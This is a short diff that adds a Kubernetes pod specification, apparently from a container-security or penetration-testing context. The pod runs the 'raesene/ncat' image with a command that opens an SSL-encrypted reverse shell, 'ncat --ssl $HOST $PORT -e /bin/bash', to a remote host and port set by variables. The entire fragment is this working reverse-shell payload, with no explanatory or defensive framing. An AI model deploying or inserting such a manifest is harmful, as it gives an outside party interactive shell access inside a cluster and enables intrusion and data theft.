@@ -1,0 +1,6 @@
+spec:
+  containers:
+  - name: container
+    image: raesene/ncat
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "ncat --ssl $HOST $PORT -e /bin/bash;" ]
